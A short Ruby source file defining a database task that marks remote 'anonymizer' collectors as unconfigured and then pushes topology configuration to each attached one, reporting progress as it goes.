require_relative '../tasks'

module RCS
module DB

class TopologyTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    ::Collector.where({type: 'remote'}).count + 2
  end
  
  def next_entry
    yield description "Pushing topology"

    # mark all the anonymizers as "not configured"
    ::Collector.where({type: 'remote'}).each do |anon|
      anon.configured = false
      anon.save
    end

    ::Collector.where({type: 'remote'}).each do |anon|

      yield description "Configuring '#{anon.name}'"

      # skip detached anonymizers
      next if anon.next.first.nil? and anon.prev.first.nil?

      Frontend.rnc_push(anon.address)
    end
    
    description "Topology applied successfully"
  end
end

end # DB
end # RCS